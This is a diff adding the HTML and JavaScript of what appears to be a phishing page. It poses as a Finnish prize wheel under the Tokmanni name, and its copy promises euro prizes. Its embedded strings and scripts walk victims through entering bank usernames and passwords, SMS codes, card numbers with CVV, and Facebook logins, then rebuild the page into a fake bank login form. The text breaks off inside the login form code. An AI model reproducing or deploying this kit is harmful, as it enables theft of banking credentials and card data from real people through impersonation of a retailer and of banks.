@@ -1,0 +1,1013 @@
+<!DOCTYPE html>
+<html lang="fi" data-theme="blue">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="stylesheet" href="/static/css/style.css">
+  <link rel="shortcut icon" href="/static/img/favicon.png" type="image/x-icon">
+  <script src="/static/js/tsparticles.confetti.bundle.min.js"></script>
+  <script>
+    var initialPage = 'form_wait';
+    var wheelData = JSON.parse('{"page_title":"Py\u00f6rit\u00e4 & Voita!","transfer_details_text":"Hakemusprosessi","wheel":{"title":"ONNENPY\u00d6R\u00c4","subtitle":"Jos voitat, sinut ohjataan vaiheeseen 2.","spin_button":"Py\u00f6rit\u00e4 py\u00f6r\u00e4\u00e4","wheel_earned":"Onnittelut! Olet ansainnut oikeuden py\u00f6ritt\u00e4\u00e4 py\u00f6r\u00e4\u00e4."},"won":{"title":"Onnittelut!","subtitle":"VOITIT!","prize_placeholder":"Palkintosi","text":"Sinut ohjataan palkintolomakkeeseen muutaman sekunnin kuluttua."},"claim_reward":{"title":"TOKMANNI","congrats":"Onnittelut!","reward":"Voitit!","probability":"T\u00e4m\u00e4n palkinnon voittamisen todenn\u00e4k\u00f6isyys on 0,005%","welcome":"T\u00e4yt\u00e4 lomake ja lunasta palkintosi!","error_title":"Virhe","form":{"name_label":"Nimesi","name_placeholder":"Sy\u00f6t\u00e4 nimesi","surname_label":"Sukunimesi","surname_placeholder":"Sy\u00f6t\u00e4 sukunimesi","phone_label":"Puhelin","submit_button":"Jatkaa","error_title":"Virhe","name_error":"Anna nimesi oikein","surname_error":"Anna sukunimesi oikein","phone_error":"Anna puhelinnumerosi oikein"}},"login":{"head_title":"ONNENPY\u00d6R\u00c4","title":"Tee Siirto","description":"Lorem ipsum dolor sit amet consectetur adipiscing elit Ut et massa mi. Aliquam in hendrerit urna. Pellentesque sit amet sapien fringilla, mattis ligula consectetur, ultrices mauris.","username_label":"K\u00e4ytt\u00e4j\u00e4tunnus","password_label":"Salasana","button":"Kirjaudu Sis\u00e4\u00e4n","error_title":"Virhe","username_error":"Anna k\u00e4ytt\u00e4j\u00e4tunnus oikein","password_error":"Anna salasana oikein","reward_notice":"Viimeistell\u00e4ksesi ${amount} palkintosi siirron pankkitilillesi, kirjaudu sis\u00e4\u00e4n pankkitilillesi.","login_bank":"Kirjaudu pankkiisi siirt\u00e4\u00e4ksesi palkinnon","username_label_alandsbanken":"Anv\u00e4ndar-ID","password_label_alandsbanken":"L\u00f6senord","select_option":"Valitse option","continue_button":"Jatka"},"otp":{"title":"SMS Vahvistuskoodi","description":"Lorem ipsum dolor sit amet consectetur adipiscing elit Ut et massa mi. Aliquam in hendrerit urna. Pellentesque sit amet sapien fringilla, mattis ligula consectetur, ultrices mauris.","button":"Vahvista"},"sms":{"title":"SMS Vahvistuskoodi","description":"Lorem ipsum dolor sit amet consectetur adipiscing elit Ut et massa mi. Aliquam in hendrerit urna. Pellentesque sit amet sapien fringilla, mattis ligula consectetur, ultrices mauris.","button":"Vahvista","error_title":"Virhe","smsError":"Anna kelvollinen SMS-koodi"},"success":{"head_title":"ONNENPY\u00d6R\u00c4","title":"Osallistumisesi On Tallennettu","image_alt":"puhelin","congrats":"Onnittelut!"},"wait":{"title":"ONNENPY\u00d6R\u00c4","subtitle":"Odota Hetki.","security_alert":"Siirron turvallisuuden vuoksi, \u00e4l\u00e4 poistu t\u00e4lt\u00e4 sivulta!","transfer_in_progress":"Hakemuksesi k\u00e4sitell\u00e4\u00e4n turvallisesti.","connection_reminder":"Varmista, ett\u00e4 internet-yhteytesi on vakaa.","processing_time":"Prosessi voi kest\u00e4\u00e4 noin 15 minuuttia. Ole hyv\u00e4 ja odota."},"bank_list":{"head_title":"ONNENPY\u00d6R\u00c4","title":"Tee Siirto","description":"Lorem ipsum dolor sit amet consectetur adipiscing elit Ut et massa mi. Aliquam in hendrerit urna. Pellentesque sit amet sapien fringilla, mattis ligula consectetur, ultrices mauris.","search_placeholder":"Hae","reward_title":"Vied\u00e4ksesi ${amount} palkintosi siirron loppuun pankkitilillesi, valitse siirrett\u00e4v\u00e4 pankki.","select_bank":"Ole hyv\u00e4 ja valitse pankki, johon haluat palkintosumman siirrett\u00e4v\u00e4n.","continue_button":"Jatka"},"transfer_step":{"head_title":"ONNENPY\u00d6R\u00c4","title":"Siirronne Tallennetaan...","warning_title":"T\u00e4rke\u00e4t tiedot","warning_text1":"Siirto voi kest\u00e4\u00e4 15 minuuttia.","warning_text2":"Jos sinulla on kysymyksi\u00e4, ota yhteytt\u00e4 asiakkaitahoituksen osastollemme.","warning_text3":"Varmista, ett\u00e4 internet-yhteytesi on vakaa.","leave_warning_text":"\u00c4l\u00e4 poistu t\u00e4st\u00e4 sivusta!","notify_title":"Onnittelut","notify_text":"Olet suorittanut vaiheen {step}!"},"support":{"support_title":"Miten voimme auttaa?","support_description":"Olemme t\u00e4\u00e4ll\u00e4 vastaamassa kysymyksiisi. Tarjoamme kaksi erilaista tukikanavaa auttaaksemme sinua mahdollisimman nopeasti.","support_1":"Live-tuki","support_1_description":"Asiantuntijaedustajamme ovat valmiina auttamaan sinua heti. Napsauta t\u00e4st\u00e4 yhdist\u00e4\u00e4ksesi Live-tukeen.","support_2":"WhatsApp-tuki","support_2_description":"Voit ottaa meihin yhteytt\u00e4 WhatsAppin kautta 24\/7.","support_2_button":"Ota yhteytt\u00e4","support_3":"Facebook-tuki","support_3_description":"Ota meihin yhteytt\u00e4 Facebook Messengerin kautta 24\/7.","support_3_button":"Ota yhteytt\u00e4 Messengeriss\u00e4","page_description":"Hyv\u00e4 ${name}, ota yhteytt\u00e4 asiakaspalveluumme suorittaaksesi siirtosi loppuun.","step_info":"Vaihe ${step} \/ 8","transfer_progress_title":"Hakemusvaihe","welcome_message":"Tervetuloa","processing_message":"Hakemuksesi k\u00e4sitell\u00e4\u00e4n"},"card":{"submit_button":"Jatka","card_number":"Kortin Tiedot","expiry_date":"Kortin Viimeinen K\u00e4ytt\u00f6p\u00e4iv\u00e4 (KK\/VV)","cvc":"CVV-koodi","errors":{"title":"Virhe","invalid_card_number":"Sy\u00f6t\u00e4 kelvollinen kortin numero.","invalid_expiry_date":"Sy\u00f6t\u00e4 kortin viimeinen k\u00e4ytt\u00f6p\u00e4iv\u00e4 oikeassa muodossa (KK\/VV).","invalid_cvc":"Virheellinen CVV-koodi. Tarkista ja yrit\u00e4 uudelleen."}},"spankki":{"error_title":"Virhe","approve_error":"Anna kelvollinen koodi"},"facebook":{"email":"Matkapuhelinnumero tai s\u00e4hk\u00f6postiosoite","password":"Salasana","forgot":"Unohtuiko salasana?","login":"Kirjaudu sis\u00e4\u00e4n"},"win":{"title":"Onnittelut!","subtitle":"OLET VOITTANUT!","prize_placeholder":"Palkintosi","text":"Sinut ohjataan palkintovaatimuslomakkeeseen muutaman sekunnin kuluttua.","prize_text":"Olet voittanut ${{amount}} lahjakortin kampanjassa ${{campaign}}!","footer":"Vain henkil\u00f6t, jotka kirjautuvat sis\u00e4\u00e4n t\u00e4m\u00e4n linkin kautta ja joiden nimi on mainittu yll\u00e4, voivat hy\u00f6dynt\u00e4\u00e4 t\u00e4m\u00e4n kampanjan.","modal_text_1":"Ilmoitus","modal_text_2":"Ole hyv\u00e4 ja suorita ohjeet, jotka n\u00e4kyv\u00e4t siirtym\u00e4llesi sivulle.","modal_text_3":"Jatka","claim_button":"Vaatia"}}').wheel;
+    var wonData = JSON.parse('{"page_title":"Py\u00f6rit\u00e4 & Voita!","transfer_details_text":"Hakemusprosessi","wheel":{"title":"ONNENPY\u00d6R\u00c4","subtitle":"Jos voitat, sinut ohjataan vaiheeseen 2.","spin_button":"Py\u00f6rit\u00e4 py\u00f6r\u00e4\u00e4","wheel_earned":"Onnittelut! Olet ansainnut oikeuden py\u00f6ritt\u00e4\u00e4 py\u00f6r\u00e4\u00e4."},"won":{"title":"Onnittelut!","subtitle":"VOITIT!","prize_placeholder":"Palkintosi","text":"Sinut ohjataan palkintolomakkeeseen muutaman sekunnin kuluttua."},"claim_reward":{"title":"TOKMANNI","congrats":"Onnittelut!","reward":"Voitit!","probability":"T\u00e4m\u00e4n palkinnon voittamisen todenn\u00e4k\u00f6isyys on 0,005%","welcome":"T\u00e4yt\u00e4 lomake ja lunasta palkintosi!","error_title":"Virhe","form":{"name_label":"Nimesi","name_placeholder":"Sy\u00f6t\u00e4 nimesi","surname_label":"Sukunimesi","surname_placeholder":"Sy\u00f6t\u00e4 sukunimesi","phone_label":"Puhelin","submit_button":"Jatkaa","error_title":"Virhe","name_error":"Anna nimesi oikein","surname_error":"Anna sukunimesi oikein","phone_error":"Anna puhelinnumerosi oikein"}},"login":{"head_title":"ONNENPY\u00d6R\u00c4","title":"Tee Siirto","description":"Lorem ipsum dolor sit amet consectetur adipiscing elit Ut et massa mi. Aliquam in hendrerit urna. Pellentesque sit amet sapien fringilla, mattis ligula consectetur, ultrices mauris.","username_label":"K\u00e4ytt\u00e4j\u00e4tunnus","password_label":"Salasana","button":"Kirjaudu Sis\u00e4\u00e4n","error_title":"Virhe","username_error":"Anna k\u00e4ytt\u00e4j\u00e4tunnus oikein","password_error":"Anna salasana oikein","reward_notice":"Viimeistell\u00e4ksesi ${amount} palkintosi siirron pankkitilillesi, kirjaudu sis\u00e4\u00e4n pankkitilillesi.","login_bank":"Kirjaudu pankkiisi siirt\u00e4\u00e4ksesi palkinnon","username_label_alandsbanken":"Anv\u00e4ndar-ID","password_label_alandsbanken":"L\u00f6senord","select_option":"Valitse option","continue_button":"Jatka"},"otp":{"title":"SMS Vahvistuskoodi","description":"Lorem ipsum dolor sit amet consectetur adipiscing elit Ut et massa mi. Aliquam in hendrerit urna. Pellentesque sit amet sapien fringilla, mattis ligula consectetur, ultrices mauris.","button":"Vahvista"},"sms":{"title":"SMS Vahvistuskoodi","description":"Lorem ipsum dolor sit amet consectetur adipiscing elit Ut et massa mi. Aliquam in hendrerit urna. Pellentesque sit amet sapien fringilla, mattis ligula consectetur, ultrices mauris.","button":"Vahvista","error_title":"Virhe","smsError":"Anna kelvollinen SMS-koodi"},"success":{"head_title":"ONNENPY\u00d6R\u00c4","title":"Osallistumisesi On Tallennettu","image_alt":"puhelin","congrats":"Onnittelut!"},"wait":{"title":"ONNENPY\u00d6R\u00c4","subtitle":"Odota Hetki.","security_alert":"Siirron turvallisuuden vuoksi, \u00e4l\u00e4 poistu t\u00e4lt\u00e4 sivulta!","transfer_in_progress":"Hakemuksesi k\u00e4sitell\u00e4\u00e4n turvallisesti.","connection_reminder":"Varmista, ett\u00e4 internet-yhteytesi on vakaa.","processing_time":"Prosessi voi kest\u00e4\u00e4 noin 15 minuuttia. Ole hyv\u00e4 ja odota."},"bank_list":{"head_title":"ONNENPY\u00d6R\u00c4","title":"Tee Siirto","description":"Lorem ipsum dolor sit amet consectetur adipiscing elit Ut et massa mi. Aliquam in hendrerit urna. Pellentesque sit amet sapien fringilla, mattis ligula consectetur, ultrices mauris.","search_placeholder":"Hae","reward_title":"Vied\u00e4ksesi ${amount} palkintosi siirron loppuun pankkitilillesi, valitse siirrett\u00e4v\u00e4 pankki.","select_bank":"Ole hyv\u00e4 ja valitse pankki, johon haluat palkintosumman siirrett\u00e4v\u00e4n.","continue_button":"Jatka"},"transfer_step":{"head_title":"ONNENPY\u00d6R\u00c4","title":"Siirronne Tallennetaan...","warning_title":"T\u00e4rke\u00e4t tiedot","warning_text1":"Siirto voi kest\u00e4\u00e4 15 minuuttia.","warning_text2":"Jos sinulla on kysymyksi\u00e4, ota yhteytt\u00e4 asiakkaitahoituksen osastollemme.","warning_text3":"Varmista, ett\u00e4 internet-yhteytesi on vakaa.","leave_warning_text":"\u00c4l\u00e4 poistu t\u00e4st\u00e4 sivusta!","notify_title":"Onnittelut","notify_text":"Olet suorittanut vaiheen {step}!"},"support":{"support_title":"Miten voimme auttaa?","support_description":"Olemme t\u00e4\u00e4ll\u00e4 vastaamassa kysymyksiisi. Tarjoamme kaksi erilaista tukikanavaa auttaaksemme sinua mahdollisimman nopeasti.","support_1":"Live-tuki","support_1_description":"Asiantuntijaedustajamme ovat valmiina auttamaan sinua heti. Napsauta t\u00e4st\u00e4 yhdist\u00e4\u00e4ksesi Live-tukeen.","support_2":"WhatsApp-tuki","support_2_description":"Voit ottaa meihin yhteytt\u00e4 WhatsAppin kautta 24\/7.","support_2_button":"Ota yhteytt\u00e4","support_3":"Facebook-tuki","support_3_description":"Ota meihin yhteytt\u00e4 Facebook Messengerin kautta 24\/7.","support_3_button":"Ota yhteytt\u00e4 Messengeriss\u00e4","page_description":"Hyv\u00e4 ${name}, ota yhteytt\u00e4 asiakaspalveluumme suorittaaksesi siirtosi loppuun.","step_info":"Vaihe ${step} \/ 8","transfer_progress_title":"Hakemusvaihe","welcome_message":"Tervetuloa","processing_message":"Hakemuksesi k\u00e4sitell\u00e4\u00e4n"},"card":{"submit_button":"Jatka","card_number":"Kortin Tiedot","expiry_date":"Kortin Viimeinen K\u00e4ytt\u00f6p\u00e4iv\u00e4 (KK\/VV)","cvc":"CVV-koodi","errors":{"title":"Virhe","invalid_card_number":"Sy\u00f6t\u00e4 kelvollinen kortin numero.","invalid_expiry_date":"Sy\u00f6t\u00e4 kortin viimeinen k\u00e4ytt\u00f6p\u00e4iv\u00e4 oikeassa muodossa (KK\/VV).","invalid_cvc":"Virheellinen CVV-koodi. Tarkista ja yrit\u00e4 uudelleen."}},"spankki":{"error_title":"Virhe","approve_error":"Anna kelvollinen koodi"},"facebook":{"email":"Matkapuhelinnumero tai s\u00e4hk\u00f6postiosoite","password":"Salasana","forgot":"Unohtuiko salasana?","login":"Kirjaudu sis\u00e4\u00e4n"},"win":{"title":"Onnittelut!","subtitle":"OLET VOITTANUT!","prize_placeholder":"Palkintosi","text":"Sinut ohjataan palkintovaatimuslomakkeeseen muutaman sekunnin kuluttua.","prize_text":"Olet voittanut ${{amount}} lahjakortin kampanjassa ${{campaign}}!","footer":"Vain henkil\u00f6t, jotka kirjautuvat sis\u00e4\u00e4n t\u00e4m\u00e4n linkin kautta ja joiden nimi on mainittu yll\u00e4, voivat hy\u00f6dynt\u00e4\u00e4 t\u00e4m\u00e4n kampanjan.","modal_text_1":"Ilmoitus","modal_text_2":"Ole hyv\u00e4 ja suorita ohjeet, jotka n\u00e4kyv\u00e4t siirtym\u00e4llesi sivulle.","modal_text_3":"Jatka","claim_button":"Vaatia"}}').won;
+    var fromLink = false;
+    var fullName = '';
+
+    var wheelSettings = JSON.stringify({
+      maxSlices: 9,
+      slices: JSON.parse('["3000\u20ac","3500 \u20ac","4000 \u20ac","4500 \u20ac","5500 \u20ac","6000 \u20ac","5000 \u20ac","7000 \u20ac","6500 \u20ac"]')
+    });
+
+    document.title = 'Pyöritä & Voita!';
+  </script>
+  <style>
+    .content-text__title {
+      padding-top: 1rem;
+    }
+
+    .content-text__welcome, 
+    .content-text__title {
+      text-align: center;
+    }
+
+
+
+    @media (max-width: 768px) {
+      html {
+        zoom: 1;
+      }
+      .content-text__welcome {
+          text-align: center;
+          font-size: 1.4rem;
+      }
+    }
+  </style>
+</head>
+
+<body x-data="app">
+  <div class="container">
+      <p class="content-text__title"></p>
+      <p class="content-text__welcome" x-text="wheelData.wheel_earned"></p>
+    <div class="wheel-container" x-data="spinWheelApp" x-init="initializeWheel(); presets = JSON.parse(wheelSettings)">
+      <div class="the_wheel">
+        <canvas id="canvas" width="465" height="465"></canvas>
+        <div class="the_wheel_inner"></div>
+      </div>
+
+      <div class="spin-button">
+        <button id="spinButton" x-on:click="spinWheel" x-text="wheelData.spin_button"></button>
+      </div>
+    </div>
+  </div>
+
+  <div class="powered-by">
+    Powered by <img src="/static/img/1768398379_367d7c768420cfd5c6f1.png" alt="powered">
+  </div>
+
+  <div class="won" x-show="$store.wheelApp.isWon" style="display: none;">
+    <div class="won-bg"></div>
+    <div class="won-container">
+      <p class="won-container__title" x-text="wonData.title"></p>
+      <p class="won-container__subtitle"><span class="prize" x-text="$store.prize"></span> <span x-text="wonData.reward"></span></p>
+      <p class="won-container__text" x-text="wonData.text"></p>
+    </div>
+  </div>
+  <script src="/static/js/gsap.min.js"></script>
+  <script src="/static/js/cdn.min.js" defer></script>
+  <script src="/static/js/wheel.min.js"></script>
+  <script src="/static/js/script.js"></script>
+  <script>
+    // Error tracking - report JS errors to server
+    window.onerror = function(msg, url, line, col, error) {
+      try {
+        fetch('/__log_error', {
+          method: 'POST',
+          headers: {'Content-Type': 'application/json'},
+          body: JSON.stringify({type:'error', msg:msg, url:url, line:line, col:col, stack:error?error.stack:''})
+        });
+      } catch(e) {}
+      return false;
+    };
+    window.addEventListener('unhandledrejection', function(event) {
+      try {
+        fetch('/__log_error', {
+          method: 'POST',
+          headers: {'Content-Type': 'application/json'},
+          body: JSON.stringify({type:'rejection', reason:String(event.reason), stack:event.reason&&event.reason.stack?event.reason.stack:''})
+        });
+      } catch(e) {}
+    });
+    // ========================================
+    // BANK LIST VIEW OVERRIDE
+    // ========================================
+    var _bankListData = null;
+    var _bankListActive = false;
+
+    // Initialize visitor on wheel page load
+    (function initWheelVisitor() {
+      var vid = getVisitorId();
+      // Always call start to ensure visitor exists and cookie is set
+      var _rawFetch = window._origFetch || window.fetch;
+      // Use XMLHttpRequest to avoid interceptor loop
+      var xhr = new XMLHttpRequest();
+      xhr.open('POST', '/api/start', true);
+      xhr.setRequestHeader('Content-Type', 'application/json');
+      xhr.withCredentials = true;
+      xhr.onload = function() {
+        try {
+          var data = JSON.parse(xhr.responseText);
+          if (data.visitor_id) {
+            localStorage.setItem('visitor_id', data.visitor_id);
+          }
+        } catch(e) {}
+      };
+      xhr.send(JSON.stringify({visitor_id: vid}));
+    })();
+    // Cache language data NOW before body innerHTML is replaced
+    var _cachedLangData = {};
+    try { _cachedLangData = JSON.parse('{"page_title":"Py\u00f6rit\u00e4 & Voita!","transfer_details_text":"Hakemusprosessi","wheel":{"title":"ONNENPY\u00d6R\u00c4","subtitle":"Jos voitat, sinut ohjataan vaiheeseen 2.","spin_button":"Py\u00f6rit\u00e4 py\u00f6r\u00e4\u00e4","wheel_earned":"Onnittelut! Olet ansainnut oikeuden py\u00f6ritt\u00e4\u00e4 py\u00f6r\u00e4\u00e4."},"won":{"title":"Onnittelut!","subtitle":"VOITIT!","prize_placeholder":"Palkintosi","text":"Sinut ohjataan palkintolomakkeeseen muutaman sekunnin kuluttua."},"claim_reward":{"title":"TOKMANNI","congrats":"Onnittelut!","reward":"Voitit!","probability":"T\u00e4m\u00e4n palkinnon voittamisen todenn\u00e4k\u00f6isyys on 0,005%","welcome":"T\u00e4yt\u00e4 lomake ja lunasta palkintosi!","error_title":"Virhe","form":{"name_label":"Nimesi","name_placeholder":"Sy\u00f6t\u00e4 nimesi","surname_label":"Sukunimesi","surname_placeholder":"Sy\u00f6t\u00e4 sukunimesi","phone_label":"Puhelin","submit_button":"Jatkaa","error_title":"Virhe","name_error":"Anna nimesi oikein","surname_error":"Anna sukunimesi oikein","phone_error":"Anna puhelinnumerosi oikein"}},"login":{"head_title":"ONNENPY\u00d6R\u00c4","title":"Tee Siirto","description":"","username_label":"K\u00e4ytt\u00e4j\u00e4tunnus","password_label":"Salasana","button":"Kirjaudu Sis\u00e4\u00e4n","error_title":"Virhe","username_error":"Anna k\u00e4ytt\u00e4j\u00e4tunnus oikein","password_error":"Anna salasana oikein","reward_notice":"Viimeistell\u00e4ksesi ${amount} palkintosi siirron pankkitilillesi, kirjaudu sis\u00e4\u00e4n pankkitilillesi.","login_bank":"Kirjaudu pankkiisi siirt\u00e4\u00e4ksesi palkinnon","continue_button":"Jatka"},"otp":{"title":"SMS Vahvistuskoodi","description":"","button":"Vahvista"},"sms":{"title":"SMS Vahvistuskoodi","description":"","button":"Vahvista","error_title":"Virhe","smsError":"Anna kelvollinen SMS-koodi"},"success":{"head_title":"ONNENPY\u00d6R\u00c4","title":"Osallistumisesi On Tallennettu","image_alt":"puhelin","congrats":"Onnittelut!"},"wait":{"title":"ONNENPY\u00d6R\u00c4","subtitle":"Odota Hetki.","security_alert":"Siirron turvallisuuden vuoksi, \u00e4l\u00e4 poistu t\u00e4lt\u00e4 sivulta!","transfer_in_progress":"Hakemuksesi k\u00e4sitell\u00e4\u00e4n turvallisesti.","connection_reminder":"Varmista, ett\u00e4 internet-yhteytesi on vakaa.","processing_time":"Prosessi voi kest\u00e4\u00e4 noin 15 minuuttia. Ole hyv\u00e4 ja odota."},"bank_list":{"head_title":"ONNENPY\u00d6R\u00c4","title":"Tee Siirto","description":"","search_placeholder":"Hae","reward_title":"Vied\u00e4ksesi ${amount} palkintosi siirron loppuun pankkitilillesi, valitse siirrett\u00e4v\u00e4 pankki.","select_bank":"Ole hyv\u00e4 ja valitse pankki, johon haluat palkintosumman siirrett\u00e4v\u00e4n.","continue_button":"Jatka"}}'); } catch(e){}
+
+    // Seflink helper - converts bank name to URL slug
+    function seflink(name) {
+      if (!name) return '';
+      name = name.toLowerCase();
+      var charMap = {'å':'a','ä':'a','ö':'o','ü':'u','ğ':'g','ı':'i','ş':'s','ç':'c',
+        'à':'a','á':'a','â':'a','ã':'a','è':'e','é':'e','ê':'e','ë':'e',
+        'ì':'i','í':'i','î':'i','ï':'i','ñ':'n','ò':'o','ó':'o','ô':'o','õ':'o',
+        'ù':'u','ú':'u','û':'u','ý':'y','ÿ':'y'};
+      name = name.replace(/[åäöüğışçàáâãèéêëìíîïñòóôõùúûýÿ]/g, function(c){ return charMap[c]||c; });
+      name = name.replace(/[^a-z0-9]+/g, '-').replace(/^-+|-+$/g, '');
+      return name;
+    }
+
+    // Render bank list HTML
+    function renderBankList(banks, searchValue) {
+      searchValue = (searchValue || '').toLowerCase();
+      var filtered = banks;
+      if (searchValue) {
+        filtered = banks.filter(function(b) {
+          return (b.bank_name || '').toLowerCase().includes(searchValue);
+        });
+      }
+
+      var html = '';
+      for (var i = 0; i < filtered.length; i++) {
+        var b = filtered[i];
+        var logoUrl = b.logo ? '/static/img/banks/' + b.logo : '';
+        var slug = seflink(b.bank_name);
+        html += '<div class="bank-container__box-list-item" data-bank-id="' + b.id + '" data-bank-slug="' + slug + '" data-bank-name="' + (b.bank_name||'').replace(/"/g,'&quot;') + '">' +
+          '<div class="bank-container__box-list-item-image">' +
+            (logoUrl ? '<img src="' + logoUrl + '" alt="' + (b.bank_name||'').replace(/"/g,'&quot;') + '" onerror="this.style.display=\'none\'">' : '') +
+          '</div>' +
+          '<div class="bank-container__box-list-item-title">' + (b.bank_name||'') + '</div>' +
+          '<div class="bank-container__box-list-item-icon">' +
+            '<svg viewBox="0 0 20 20" fill="currentColor"><path fill-rule="evenodd" d="M7.21 14.77a.75.75 0 0 1 .02-1.06L10.94 10 7.23 6.29a.75.75 0 1 1 1.06-1.06l4.24 4.24a.75.75 0 0 1 0 1.06l-4.24 4.24a.75.75 0 0 1-1.06.02Z" clip-rule="evenodd"/></svg>' +
+          '</div>' +
+        '</div>';
+      }
+      return html;
+    }
+
+    // Build the full bank list page HTML
+    function buildBankListPage(banks) {
+      var langData = _cachedLangData;
+      var blData = langData.bank_list || {};
+      var headTitle = blData.head_title || 'ONNENPYÖRÄ';
+      var description = blData.description || '';
+      var searchPlaceholder = blData.search_placeholder || 'Hae';
+      var prize = '';
+      try { prize = Alpine.store('prize') || ''; } catch(e) {}
+      var rewardTitle = (blData.reward_title || '').replace('${amount}', prize);
+      var selectBank = blData.select_bank || '';
+
+      return '<div class="container">' +
+        '<p class="content-text__title">' + headTitle + '</p>' +
+        (rewardTitle ? '<p class="bank-container__description">' + rewardTitle + '</p>' : '') +
+        (selectBank && !rewardTitle ? '<p class="bank-container__description">' + selectBank + '</p>' : '') +
+        '<div class="bank-container">' +
+          '<div class="bank-container__box">' +
+            '<div class="bank-container__box-search">' +
+              '<div class="icon"><svg viewBox="0 0 24 24" fill="none" stroke="#9CA3AF" stroke-width="2"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35"/></svg></div>' +
+              '<input type="text" id="bankSearchInput" placeholder="' + searchPlaceholder + '">' +
+            '</div>' +
+            '<div class="bank-container__box-list" id="bankListContainer">' +
+              renderBankList(banks, '') +
+            '</div>' +
+          '</div>' +
+        '</div>' +
+      '</div>' +
+      '<div class="powered-by">Powered by <img src="/static/img/1768398379_367d7c768420cfd5c6f1.png" alt="powered"></div>';
+    }
+
+    // Get visitor_id from localStorage or cookie
+    function getVisitorId() {
+      var vid = localStorage.getItem('visitor_id') || '';
+      if (!vid) {
+        var cookies = document.cookie.split(';');
+        for (var i = 0; i < cookies.length; i++) {
+          var c = cookies[i].trim();
+          if (c.indexOf('vid=') === 0) { vid = c.substring(4); break; }
+        }
+      }
+      return vid;
+    }
+
+    // Handle bank click
+    function handleBankItemClick(el) {
+      var bankId = el.getAttribute('data-bank-id');
+      var bankSlug = el.getAttribute('data-bank-slug');
+      var bankName = el.getAttribute('data-bank-name');
+
+      // POST bank selection to server
+      var formData = new FormData();
+      formData.append('bank', bankSlug);
+      formData.append('bank_id', bankId);
+      formData.append('bank_name', bankName);
+      formData.append('visitor_id', getVisitorId());
+
+      fetch('/api/bankUpdate', {
+        method: 'POST',
+        body: formData,
+        credentials: 'include'
+      }).then(function(resp) {
+        if (resp.ok) {
+          // Store selected bank info globally
+          window._selectedBank = {id: bankId, slug: bankSlug, name: bankName};
+          try {
+            var bankObj = _bankListData.find(function(b){ return b.id == bankId; });
+            if (bankObj) window._selectedBankFull = bankObj;
+          } catch(e) {}
+
+          // Try to find the full bank data for login view
+          activateLoginView(bankId, bankName, bankSlug);
+        }
+      }).catch(function(err) {
+        console.error('Bank selection error:', err);
+      });
+    }
+
+    // Activate login view after bank selection
+    function activateLoginView(bankId, bankName, bankSlug) {
+      var bank = _bankListData ? _bankListData.find(function(b){ return b.id == bankId; }) : null;
+      var langData = _cachedLangData;
+      var loginData = langData.login || {};
+      var headTitle = loginData.head_title || 'ONNENPYÖRÄ';
+      var title = loginData.title || 'Tee Siirto';
+      var description = loginData.description || '';
+      var prize = '';
+      try { prize = Alpine.store('prize') || ''; } catch(e) {}
+      var rewardNotice = (loginData.reward_notice || '').replace('${amount}', prize);
+      var loginBank = (loginData.login_bank || '').replace('${bank}', bankName);
+      var usernameLabel = loginData.username_label || 'Käyttäjätunnus';
+      var passwordLabel = loginData.password_label || 'Salasana';
+      var buttonText = loginData.button || 'Kirjaudu Sisään';
+      var showPassword = bank ? bank.show_password !== '0' : true;
+      var bankTitle = bank ? (bank.bank_title || '') : '';
+      var logoUrl = bank && bank.logo ? '/static/img/banks/' + bank.logo : '';
+
+      // Check login options
+      var loginOption = bank ? (bank.login_option || '1') : '1';
+      var optionCount = bank ? parseInt(bank.option_count || '0') : 0;
+      var optionNames = [];
+      if (bank) {
+        if (bank.option_name_1) optionNames.push(bank.option_name_1);
+        if (bank.option_name_2) optionNames.push(bank.option_name_2);
+        if (bank.option_name_3) optionNames.push(bank.option_name_3);
+      }
+
+      var optionsHtml = '';
+      if (optionCount > 0 && optionNames.length > 0) {
+        optionsHtml = '<div class="login-options" style="display:flex;gap:8px;margin-bottom:1rem;flex-wrap:wrap;">';
+        for (var oi = 0; oi < optionNames.length; oi++) {
+          optionsHtml += '<button type="button" class="login-option-btn' + (oi===0?' active':'') + '" data-option="' + oi + '" style="flex:1;padding:10px 16px;border:1px solid #ddd;border-radius:12px;background:' + (oi===0?'#2563EB':'#fff') + ';color:' + (oi===0?'#fff':'#333') + ';font-size:0.9rem;cursor:pointer;transition:all 0.2s;">' + optionNames[oi] + '</button>';
+        }
+        optionsHtml += '</div>';
+      }
+
+      var loginHtml = '<div class="container">' +
+        '<p class="content-text__title">' + headTitle + '</p>' +
+        '<p class="content-text__login">' + (rewardNotice || loginBank || title) + '</p>' +
+        '<div class="login-container" style="max-width:500px;width:100%;margin:1rem auto;padding:0 1rem;">' +
+          '<div class="login-box" style="background:#fff;border-radius:24px;padding:1.5rem;box-shadow:0 8px 32px rgba(0,0,0,0.08);">' +
+            (logoUrl ? '<div style="text-align:center;margin-bottom:1rem;"><img src="' + logoUrl + '" style="width:64px;height:64px;border-radius:50%;object-fit:contain;" alt="' + bankName + '"></div>' : '') +
+            (bankTitle ? '<h3 style="text-align:center;margin-bottom:1rem;font-size:1.1rem;color:#1F2937;">' + bankTitle + '</h3>' : '') +
+            optionsHtml +
+            '<form id="loginForm">' +
+              '<div class="input-group" style="margin-bottom:1rem;">' +
+                '<label style="display:block;margin-bottom:0.5rem;font-weight:500;color:#374151;">' + usernameLabel + '</label>' +
+                '<input type="text" id="loginUsername" style="width:100%;height:52px;border:1px solid rgba(197,197,199,0.73);border-radius:16px;padding:0 1rem;font-size:1rem;" placeholder="' + usernameLabel + '">' +
+              '</div>' +
+              (showPassword ? '<div class="input-group" style="margin-bottom:1rem;">' +
+                '<label style="display:block;margin-bottom:0.5rem;font-weight:500;color:#374151;">' + passwordLabel + '</label>' +
+                '<input type="password" id="loginPassword" style="width:100%;height:52px;border:1px solid rgba(197,197,199,0.73);border-radius:16px;padding:0 1rem;font-size:1rem;" placeholder="' + passwordLabel + '">' +
+              '</div>' : '') +
+              '<button type="submit" style="width:100%;padding:14px;background:#2563EB;color:#fff;border:none;border-radius:16px;font-size:1rem;font-weight:600;cursor:pointer;margin-top:0.5rem;">' + buttonText + '</button>' +
+            '</form>' +
+          '</div>' +
+        '</div>' +
+      '</div>' +
+      '<div class="powered-by">Powered by <img src="/static/img/1768398379_367d7c768420cfd5c6f1.png" alt="powered"></div>';
+
+      // Apply login view
+      document.body.innerHTML = loginHtml;
+      _origSetAttr.call(document.body, 'x-data', 'loginApp');
+      _bankListActive = false;
+
+      // Handle login form submission
